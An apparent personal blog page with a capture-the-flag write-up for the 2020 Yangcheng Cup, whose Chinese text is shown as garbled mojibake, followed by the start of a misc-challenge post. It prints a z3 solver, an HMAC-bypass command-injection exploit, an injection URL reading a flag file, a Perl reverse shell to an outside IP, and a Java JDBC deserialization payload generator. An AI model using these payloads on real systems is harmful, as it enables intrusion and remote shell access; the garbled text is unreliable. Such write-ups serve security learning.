<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="https://www.ccreater.top/page/9/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-ç¾ŠåŸæ¯2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/">ç¾ŠåŸæ¯2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ç¾ŠåŸæ¯-2020"><a href="#ç¾ŠåŸæ¯-2020" class="headerlink" title="ç¾ŠåŸæ¯ 2020"></a>ç¾ŠåŸæ¯ 2020</h1><h2 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h2><p>è¿™æ¬¡æ‹¿äº†ç¬¬ä¸‰ï¼Œå¸®è‹å“¥æ‰¬åå¾ˆå¼€å¿ƒï¼ˆé˜Ÿåï¼šç”œç”œçš„æ‹çˆ±ä¸è‹å“¥æœ‰å…³ï¼‰:joy:</p>
<p>å¯¹äºæˆ‘è¿™ä¸ªğŸ¥¬:baby_chick: æ¥è¯´è¿˜æ˜¯æŒºå¥½çš„</p>
<h2 id="com"><a href="#com" class="headerlink" title="com"></a>com</h2><pre><code>360 883 394 719 183 923 431 873 678 798 1007 1018 160 467 684 288 801 251 991 721 326 529 479 786 199 275 814 835 956 176 720 549 590 304 816 10514983
822 520 807 909 36 513 663 319 527 806 190 213 750 260 358 516 188 882 695 619 118 304 277 459 822 123 356 630 802 1011 556 408 545 896 953 8672626
717 243 440 842 40 779 127 408 537 150 918 925 462 890 277 743 448 595 267 115 299 681 929 166 648 428 326 72 595 895 557 752 442 210 286 7647213
20 664 312 720 579 938 821 802 172 465 661 121 569 730 669 530 12 503 480 798 481 917 238 85 654 638 869 676 583 655 17 899 346 585 124 9059689
642 599 51 755 409 640 239 70 69 919 913 104 203 524 770 930 251 373 292 499 603 69 813 1010 937 315 191 719 444 127 987 85 848 955 363 8105071
488 718 257 133 1007 142 897 70 65 160 546 648 790 448 900 310 18 523 392 595 640 284 849 83 384 976 44 472 434 829 987 111 92 789 993 7583209
464 669 740 236 876 266 534 597 799 290 619 812 655 897 159 810 606 808 763 577 498 953 1016 7 736 50 734 397 1 883 456 278 883 1006 301 9813063
388 364 318 475 753 473 753 375 84 26 520 184 1023 971 263 973 896 839 60 306 772 910 787 174 518 325 205 136 808 902 638 980 418 624 882 8934784
332 666 462 268 190 331 76 999 931 686 237 525 612 201 136 920 398 836 122 582 710 348 873 127 606 851 197 194 393 799 399 934 975 53 145 8265602
676 158 397 796 891 277 301 561 658 231 587 807 508 73 420 990 797 137 656 494 886 556 698 601 314 28 942 799 906 762 235 745 422 112 69 8906990
938 405 685 339 53 44 861 233 836 74 647 843 760 634 999 658 815 652 376 172 839 388 224 28 846 815 52 404 987 927 790 489 376 56 459 8898943
78 412 817 519 588 469 810 178 309 694 567 301 598 792 433 279 772 949 899 848 914 611 861 719 401 129 786 912 708 284 940 784 197 988 940 10115461
938 689 506 915 568 882 291 554 97 888 914 740 388 698 422 481 443 454 904 430 1010 826 972 728 342 519 212 909 708 518 691 258 494 363 981 10279244
894 865 667 844 496 337 748 686 153 776 727 287 798 108 14 335 680 138 340 65 405 494 927 664 871 522 900 54 655 500 750 56 111 273 496 7192064
319 675 450 810 219 268 31 424 732 1017 800 650 806 124 463 461 242 149 999 647 891 658 717 377 313 876 64 298 472 708 272 436 953 525 840 8669041
913 929 896 460 18 367 976 883 263 120 988 417 702 1019 399 651 353 423 112 311 862 683 275 478 739 893 135 809 63 364 181 507 18 996 414 8964322
351 716 903 476 21 109 861 592 327 136 354 114 928 288 33 308 60 44 553 326 601 63 741 802 239 752 495 933 875 172 613 353 554 976 854 7215073
786 784 387 450 624 575 553 154 71 714 469 669 896 502 869 831 202 150 743 368 165 240 728 536 1019 55 1006 170 295 613 441 502 989 409 798 8681868
8 608 378 623 140 832 641 685 683 820 728 949 310 510 452 666 602 513 39 852 278 28 978 306 616 280 824 36 768 964 596 874 922 959 18 9009965
434 238 147 2 64 820 473 110 876 711 891 1021 380 230 936 112 558 534 858 218 436 800 366 94 644 839 1016 727 863 524 732 505 688 996 694 9323233
366 115 801 676 561 199 219 197 807 259 201 394 701 440 1019 120 696 631 562 965 621 105 385 133 687 589 226 743 604 813 180 537 68 727 417 7838602
515 826 753 549 593 486 992 610 591 321 685 615 110 734 710 112 109 1017 755 68 552 217 682 558 861 1003 363 476 315 156 360 832 773 252 557 9223162
883 747 540 720 679 478 45 910 84 841 1015 113 82 731 85 552 430 771 504 136 794 128 19 1005 878 327 582 535 846 344 146 531 991 711 414 8706730
498 953 79 629 796 742 726 491 133 742 168 452 399 277 995 676 520 690 898 903 234 678 0 827 279 831 834 893 422 207 435 293 180 268 955 9970522
552 172 551 90 291 336 616 943 47 317 48 628 644 434 738 707 620 479 504 319 101 906 128 270 346 596 740 819 928 233 31 869 279 701 158 7881629
596 67 953 395 544 923 189 454 929 684 797 297 428 164 788 682 917 397 9 227 839 897 34 767 737 335 105 618 115 336 879 136 131 177 113 8566453
717 31 5 257 845 545 419 569 9 366 684 133 52 346 30 203 101 433 635 974 840 262 632 751 53 217 454 638 53 154 267 396 784 800 311 7486378
118 960 307 65 826 959 229 528 955 206 350 553 448 710 578 656 563 891 445 519 802 294 915 97 59 630 770 801 978 549 541 904 144 615 54 9364748
238 455 363 647 684 400 1006 127 5 248 128 381 676 599 196 890 577 590 143 513 874 770 32 614 16 662 606 143 326 384 245 236 839 644 607 8370183
223 896 922 223 149 897 873 184 350 824 393 38 625 84 50 64 857 889 104 365 177 964 397 941 904 1012 780 736 545 102 795 37 314 629 922 8391555
838 497 263 731 631 662 851 125 914 527 536 424 635 373 502 389 433 22 752 119 558 701 227 585 688 947 15 741 164 800 547 685 537 676 864 9369252
805 986 243 584 987 497 866 526 480 984 668 927 473 19 921 223 45 340 7 31 863 548 40 754 548 998 768 888 476 208 678 436 611 329 489 9724217
598 15 64 563 597 442 689 980 174 862 457 745 631 546 580 596 549 1011 286 93 74 143 56 72 206 756 72 125 844 1015 1000 928 474 884 594 7947611
784 441 438 394 802 590 323 525 357 778 906 194 873 197 192 746 363 689 160 802 302 856 335 118 1016 304 193 767 308 585 523 494 437 346 859 8364295
1003 992 57 630 267 37 731 281 607 181 296 487 96 736 523 243 337 88 508 643 765 267 619 628 544 581 971 105 608 297 709 281 424 257 902 8652387</code></pre><p>è§‚å¯Ÿæ ¼å¼å‘ç°æ˜¯ä¸€ä¸ª36*35çš„çŸ©é˜µï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯ä¸€ä¸ª35å…ƒä¸€æ¬¡çº¿æ€§æ–¹ç¨‹ç»„</p>
<pre><code>from z3 import *

a=&quot;&quot;&quot;360 883 394 719 183 923 431 873 678 798 1007 1018 160 467 684 288 801 251 991 721 326 529 479 786 199 275 814 835 956 176 720 549 590 304 816 10514983
822 520 807 909 36 513 663 319 527 806 190 213 750 260 358 516 188 882 695 619 118 304 277 459 822 123 356 630 802 1011 556 408 545 896 953 8672626
717 243 440 842 40 779 127 408 537 150 918 925 462 890 277 743 448 595 267 115 299 681 929 166 648 428 326 72 595 895 557 752 442 210 286 7647213
20 664 312 720 579 938 821 802 172 465 661 121 569 730 669 530 12 503 480 798 481 917 238 85 654 638 869 676 583 655 17 899 346 585 124 9059689
642 599 51 755 409 640 239 70 69 919 913 104 203 524 770 930 251 373 292 499 603 69 813 1010 937 315 191 719 444 127 987 85 848 955 363 8105071
488 718 257 133 1007 142 897 70 65 160 546 648 790 448 900 310 18 523 392 595 640 284 849 83 384 976 44 472 434 829 987 111 92 789 993 7583209
464 669 740 236 876 266 534 597 799 290 619 812 655 897 159 810 606 808 763 577 498 953 1016 7 736 50 734 397 1 883 456 278 883 1006 301 9813063
388 364 318 475 753 473 753 375 84 26 520 184 1023 971 263 973 896 839 60 306 772 910 787 174 518 325 205 136 808 902 638 980 418 624 882 8934784
332 666 462 268 190 331 76 999 931 686 237 525 612 201 136 920 398 836 122 582 710 348 873 127 606 851 197 194 393 799 399 934 975 53 145 8265602
676 158 397 796 891 277 301 561 658 231 587 807 508 73 420 990 797 137 656 494 886 556 698 601 314 28 942 799 906 762 235 745 422 112 69 8906990
938 405 685 339 53 44 861 233 836 74 647 843 760 634 999 658 815 652 376 172 839 388 224 28 846 815 52 404 987 927 790 489 376 56 459 8898943
78 412 817 519 588 469 810 178 309 694 567 301 598 792 433 279 772 949 899 848 914 611 861 719 401 129 786 912 708 284 940 784 197 988 940 10115461
938 689 506 915 568 882 291 554 97 888 914 740 388 698 422 481 443 454 904 430 1010 826 972 728 342 519 212 909 708 518 691 258 494 363 981 10279244
894 865 667 844 496 337 748 686 153 776 727 287 798 108 14 335 680 138 340 65 405 494 927 664 871 522 900 54 655 500 750 56 111 273 496 7192064
319 675 450 810 219 268 31 424 732 1017 800 650 806 124 463 461 242 149 999 647 891 658 717 377 313 876 64 298 472 708 272 436 953 525 840 8669041
913 929 896 460 18 367 976 883 263 120 988 417 702 1019 399 651 353 423 112 311 862 683 275 478 739 893 135 809 63 364 181 507 18 996 414 8964322
351 716 903 476 21 109 861 592 327 136 354 114 928 288 33 308 60 44 553 326 601 63 741 802 239 752 495 933 875 172 613 353 554 976 854 7215073
786 784 387 450 624 575 553 154 71 714 469 669 896 502 869 831 202 150 743 368 165 240 728 536 1019 55 1006 170 295 613 441 502 989 409 798 8681868
8 608 378 623 140 832 641 685 683 820 728 949 310 510 452 666 602 513 39 852 278 28 978 306 616 280 824 36 768 964 596 874 922 959 18 9009965
434 238 147 2 64 820 473 110 876 711 891 1021 380 230 936 112 558 534 858 218 436 800 366 94 644 839 1016 727 863 524 732 505 688 996 694 9323233
366 115 801 676 561 199 219 197 807 259 201 394 701 440 1019 120 696 631 562 965 621 105 385 133 687 589 226 743 604 813 180 537 68 727 417 7838602
515 826 753 549 593 486 992 610 591 321 685 615 110 734 710 112 109 1017 755 68 552 217 682 558 861 1003 363 476 315 156 360 832 773 252 557 9223162
883 747 540 720 679 478 45 910 84 841 1015 113 82 731 85 552 430 771 504 136 794 128 19 1005 878 327 582 535 846 344 146 531 991 711 414 8706730
498 953 79 629 796 742 726 491 133 742 168 452 399 277 995 676 520 690 898 903 234 678 0 827 279 831 834 893 422 207 435 293 180 268 955 9970522
552 172 551 90 291 336 616 943 47 317 48 628 644 434 738 707 620 479 504 319 101 906 128 270 346 596 740 819 928 233 31 869 279 701 158 7881629
596 67 953 395 544 923 189 454 929 684 797 297 428 164 788 682 917 397 9 227 839 897 34 767 737 335 105 618 115 336 879 136 131 177 113 8566453
717 31 5 257 845 545 419 569 9 366 684 133 52 346 30 203 101 433 635 974 840 262 632 751 53 217 454 638 53 154 267 396 784 800 311 7486378
118 960 307 65 826 959 229 528 955 206 350 553 448 710 578 656 563 891 445 519 802 294 915 97 59 630 770 801 978 549 541 904 144 615 54 9364748
238 455 363 647 684 400 1006 127 5 248 128 381 676 599 196 890 577 590 143 513 874 770 32 614 16 662 606 143 326 384 245 236 839 644 607 8370183
223 896 922 223 149 897 873 184 350 824 393 38 625 84 50 64 857 889 104 365 177 964 397 941 904 1012 780 736 545 102 795 37 314 629 922 8391555
838 497 263 731 631 662 851 125 914 527 536 424 635 373 502 389 433 22 752 119 558 701 227 585 688 947 15 741 164 800 547 685 537 676 864 9369252
805 986 243 584 987 497 866 526 480 984 668 927 473 19 921 223 45 340 7 31 863 548 40 754 548 998 768 888 476 208 678 436 611 329 489 9724217
598 15 64 563 597 442 689 980 174 862 457 745 631 546 580 596 549 1011 286 93 74 143 56 72 206 756 72 125 844 1015 1000 928 474 884 594 7947611
784 441 438 394 802 590 323 525 357 778 906 194 873 197 192 746 363 689 160 802 302 856 335 118 1016 304 193 767 308 585 523 494 437 346 859 8364295
1003 992 57 630 267 37 731 281 607 181 296 487 96 736 523 243 337 88 508 643 765 267 619 628 544 581 971 105 608 297 709 281 424 257 902 8652387&quot;&quot;&quot;
a=a.splitlines()
s=[]
result=[0]*35
for i in a:
    s.append(i.split(&quot; &quot;))

solve = Solver()
X =  [Int(&#39;x%s&#39; % i) for i in range(35) ]
for i in range(len(s)):
    for j in range(len(s[i][:-1])):
        result[i]+=int(s[i][j])*X[j]
for i in range(len(s)):
    solve.add(result[i]==int(s[i][-1]))
print solve.check()
m = solve.model()
print &quot;traversing model...&quot;
pri=[]
for i in range(35):
    pri.append(int(&quot;%s&quot; % (m[X[i]])))
print pri
</code></pre><p>GWHT{4b55c1d5fb6a0234fc252b19e510301a}</p>
<h2 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h2><p>ç›´æ¥å‘½ä»¤æ‰§è¡Œ</p>
<h2 id="blackhat"><a href="#blackhat" class="headerlink" title="blackhat"></a>blackhat</h2><p>æŸ¥çœ‹Hei_Mao_Jing_Chang.mp3å‘ç°æºæ–‡ä»¶ä»£ç ï¼š</p>
<pre><code>if(empty($_POST[&#39;Black-Cat-Sheriff&#39;]) || empty($_POST[&#39;One-ear&#39;])){
    die(&#39;Ë­ï¿½ï¿½ï¿½ï¿½ï¿½Ò²ï¿½ï¿½ï¿½Ò»Ö»ï¿½ï¿½ï¿½ï¿½Î²ï¿½Í£ï¿½&#39;);
}

$clandestine = getenv(&quot;clandestine&quot;);

if(isset($_POST[&#39;White-cat-monitor&#39;]))
    $clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);


$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);

if($hh !== $_POST[&#39;Black-Cat-Sheriff&#39;]){
    die(&#39;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½×¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½×¼ï¿½ï¿½Ä¿ï¿½ê¡£ï¿½ï¿½ï¿½ï¿½ï¿½Ô¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ç¿ï¿½ï¿½ï¿½ï¿½Ğ°ï¿½ï¿½Äµï¿½ï¿½Óµï¿½ï¿½ï¿½&#39;);
}

echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);
</code></pre><p>ä»¤<code>$_POST[&#39;White-cat-monitor&#39;]</code>ä¸ºç©ºä»è€Œæ§åˆ¶<code>$clandestine</code></p>
<p>exp:</p>
<pre><code class="php">import hmac
import requests

cmd=b&quot; ccreater.top:60006||cat /var/www/html/flag.php&quot;
h = hmac.new(b&quot;&quot;, cmd, digestmod=&#39;sha256&#39;).hexdigest()


burp0_url = &quot;http://183.129.189.60:10022/&quot;
burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
burp0_data = {&quot;White-cat-monitor[]&quot;: &#39;&#39;, &quot;One-ear&quot;: cmd, &quot;Black-Cat-Sheriff&quot;: h}
r=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
print(r.text)</code></pre>
<p>æ‹¿åˆ°flag</p>
<h2 id="easyphp2"><a href="#easyphp2" class="headerlink" title="easyphp2"></a>easyphp2</h2><p>æ‰«ç›®å½•å‘ç°robots.txtå¾—åˆ°æç¤ºï¼š</p>
<p><code>/?file=check.php</code></p>
<p>åˆ©ç”¨fileå¤„çš„ä»»æ„æ–‡ä»¶è¯»å–è·å¾— check.phpå†…å®¹ï¼ˆç”¨zlibå‹ç¼©ç»•è¿‡base64è¢«banï¼‰ï¼Œè·å¾—å¯†ç ï¼šGWHT,ä¸€æ¬¡è¯»å–GWHT.phpå¾—çŸ¥countå‚æ•°å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œ,å…¨å±€æŸ¥æ‰¾å‘ç°</p>
<p>/GWHT/system/of/a/down/flag.txt</p>
<p><code>http://183.129.189.60:10025/GWHT.php?count=123&#39;%26%26cat+/GWHT/system/of/a/down/flag.txt%26%26sss%26%26&#39;</code></p>
<p>/GWHT/ç›®å½•ä¸‹çš„readmeå­˜ç€GWHTçš„å¯†ç ï¼Œå»cmd5èŠ±ä¸€å—é’±è§£å¯†å¾—åˆ°å¯†ç </p>
<p>My password hash is 877862561ba0162ce610dd8bf90868ad414f0ec6. :<code>GWHTCTF</code> </p>
<p>/GWHTä¸‹findaasçš„å†…å®¹ï¼ˆåŸæœ¬ä»¥ä¸ºè¿™ä¸ªæ–‡ä»¶æœ‰Sæƒé™ï¼‰</p>
<pre><code class="bash=">#! /bin/bash

echo &quot;Enter a filename and find it here!&quot;

find . -name $1</code></pre>
<p>åˆ©ç”¨åå¼¹shellæ¥ç™»é™†GWHT</p>
<p>åå¼¹shell</p>
<pre><code>system(&#39;perl -e \&#39;use Socket;$i=&quot;39.108.164.219&quot;;$p=60007;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};\&#39;&#39;);</code></pre><p><code>GWHT{Y0U_H4VE_A_BETTER_SK1LL}</code></p>
<h2 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h2><p><a href="https://www.anquanke.com/post/id/203086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203086</a><br>JDBCååºåˆ—åŒ–ï¼š<br>InfoInvocationHandler::invoke-&gt;Databaseinfo::checkAllInfo-&gt;DriverManager.getConnection</p>
<pre><code class="java=">@GetMapping(&quot;/hello&quot;)
    public String hello(@CookieValue(value = &quot;data&quot;, required = false)String cookieData, Model model) {
        if (cookieData == null || cookieData.equals(&quot;&quot;)) {
            return &quot;redirect:/index&quot;;
        }
        Info info = (Info)deserialize(cookieData);
        if (info != null) {
            model.addAttribute(&quot;info&quot;, info.getAllInfo());
        }
        return &quot;hello&quot;;
    }</code></pre>
<p>DatabaseInfo</p>
<pre><code class="java=">

public class DatabaseInfo implements Serializable, Info {

...

    private void connect() {
        String url = &quot;jdbc:mysql://&quot; + this.host + &quot;:&quot; + this.port + &quot;/jdbc?user=&quot; + this.username + &quot;&amp;password=&quot; + this.password + &quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;;
        try {
            this.connection = DriverManager.getConnection(url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Boolean checkAllInfo() {
        if (this.host == null || this.port == null || this.username == null || this.password == null) {
            return false;
        }
        if (this.connection == null) {
            connect();
        }
        return true;
    }

</code></pre>
<pre><code class="java=">public class InfoInvocationHandler implements InvocationHandler, Serializable {
    private Info info;

    public InfoInvocationHandler(Info info) {
        this.info = info;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) {
        try {
            if (method.getName().equals(&quot;getAllInfo&quot;)) {
                if (!this.info.checkAllInfo()) {
                    return null;
                }
            }
            return method.invoke(this.info, args);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}</code></pre>
<p>åˆ©ç”¨proxyinstanceæ¥è°ƒç”¨InfoInvocationHandler çš„invokeæ–¹æ³•ä»è€Œå®Œæˆä¸Šè¿°çš„åˆ©ç”¨é“¾</p>
<p>åˆ©ç”¨è¿™ä¸ªæ¥ç”Ÿæˆdata</p>
<pre><code class="java=">import gdufs.challenge.web.invocation.InfoInvocationHandler;
import gdufs.challenge.web.model.DatabaseInfo;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class test {
    public static void main(String args[]){
        DatabaseInfo db = new DatabaseInfo();
        db.setHost(&quot;39.108.164.219&quot;);
        db.setPort(&quot;60006&quot;);
        //db.setUsername(&quot;yso_JRE8u20_calc&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;&quot;);
        db.setUsername(&quot;Spring1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;&quot;);
        db.setPassword(&quot;123456&quot;);
        InvocationHandler handler = new InfoInvocationHandler(db);

        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream out = null;
        try {
            out = new ObjectOutputStream(bout);
            out.writeObject(Proxy.newProxyInstance(handler.getClass().getClassLoader(), db.getClass().getInterfaces(), handler));
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println(new String(Base64.getEncoder().encode(bout.toByteArray())));

    }
}
</code></pre>
<p>æµ‹è¯•å‘ç°CommonsCollections6å’ŒCommonsCollections5å¯ä»¥æ‰“é€šï¼Œä½†æ˜¯ç”±äºRuntime.getRuntime().exec()ä¸­ä¸èƒ½ä½¿ç”¨ç®¡é“ç¬¦ç­‰bashéœ€è¦çš„æ–¹æ³•,åˆ©ç”¨è¿™ä¸ªæ¥ç»•è¿‡<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a><br><code>GWHT{5e97245bd9c98aad7040d461538e9231}</code></p>
<p>jdbcä¹Ÿå¯ä»¥ç›´æ¥è¯»æ–‡ä»¶ï¼Œä½†æ˜¯è¿™é‡Œä¸è¡Œï¼Œåæ¥çœ‹åˆ«äººçš„wpå‘ç°è¦åŠ ä¸Šè®¾ç½®ï¼š<code>allowLoadLocalInfile=true</code></p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>å†™.htaccessä»è€Œrce</p>
<h2 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h2><p>è€å¥—è·¯äº†</p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/ç¾ŠåŸæ¯2020/">https://www.ccreater.top/1970/01/01/ç¾ŠåŸæ¯2020/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/" data-id="ckmn5757w008qs1ni3l8r7vml" data-title="ç¾ŠåŸæ¯2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-æŸmisc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/%E6%9F%90misc/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">åšé¢˜ç¬”è®°</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/%E6%9F%90misc/">æŸmisc</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ä¸çŸ¥é“å“ªé‡Œçš„misc"><a href="#ä¸çŸ¥é“å“ªé‡Œçš„misc" class="headerlink" title="ä¸çŸ¥é“å“ªé‡Œçš„misc"></a>ä¸çŸ¥é“å“ªé‡Œçš„misc</h1><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…</p>
<p>é‡Œé¢æœ‰ä¸€ä¸ªåŠ å¯†çš„è§†é¢‘æ–‡ä»¶å’ŒæœªåŠ å¯†çš„å›¾ç‰‡</p>
<p><img src="https://i.loli.net/2020/02/19/ptInrs6axclk12u.png" alt="image105"></p>
<p>æƒ³ç€å›¾ç‰‡ä¼šä¸ä¼šæœ‰æç¤º,ç”¨hxdæ‰“å¼€å‘ç°æœ«å°¾æœç„¶æœ‰æç¤º</p>
<p>kobe code</p>
<p><img src="https://i.loli.net/2020/02/19/mVqDzgoHdyOWBnT.png" alt="image211"></p>
<p>å¾—åˆ°å¯†ç :<code>OAEBEYTKNRBANB</code>,æˆåŠŸæ‹¿åˆ°è§†é¢‘æ–‡ä»¶</p>
<p>ä½†æ˜¯æç¤ºæ–‡ä»¶æ— æ³•æ‰“å¼€,ç”¨binwalkå•¥çš„å¼„äº†ä¸€ä¼š,å‘ç°é‡Œé¢æ²¡æœ‰è—å•¥</p>
<p>äºæ˜¯æ¢äº†ä¸ªæ€è·¯,çŒœæµ‹è¿™é¢˜æ˜¯è¦è®©æˆ‘ä»¬ä¿®å¤mp4æ–‡ä»¶?å¤´å¤§</p>
<blockquote>
<p>ä¸€ä¸ªMP4æ–‡ä»¶é¦–å…ˆä¼šæœ‰ä¸”åªæœ‰ä¸€ä¸ªâ€œftypâ€ç±»å‹çš„boxï¼Œä½œä¸ºMP4æ ¼å¼çš„æ ‡å¿—å¹¶åŒ…å«å…³äºæ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼›ä¹‹åä¼šæœ‰ä¸”åªæœ‰ä¸€ä¸ªâ€œmoovâ€ç±»å‹çš„boxï¼ˆMovie Boxï¼‰ï¼Œå®ƒæ˜¯ä¸€ç§container boxï¼Œå­boxåŒ…å«äº†åª’ä½“çš„metadataä¿¡æ¯ï¼›MP4æ–‡ä»¶çš„åª’ä½“æ•°æ®åŒ…å«åœ¨â€œmdatâ€ç±»å‹çš„boxï¼ˆMidia Data Boxï¼‰ä¸­ï¼Œè¯¥ç±»å‹çš„boxä¹Ÿæ˜¯container boxï¼Œå¯ä»¥æœ‰å¾ˆå¤šä¸ªï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰ï¼ˆå½“åª’ä½“æ•°æ®å…¨éƒ¨å¼•ç”¨å…¶ä»–æ–‡ä»¶æ—¶ï¼‰ï¼Œåª’ä½“æ•°æ®çš„ç»“æ„ç”±metadataè¿›è¡Œæè¿°ã€‚</p>
</blockquote>
<p><img src="https://i.loli.net/2020/02/19/NVA3PtERXBqfwcd.png" alt="image622"></p>
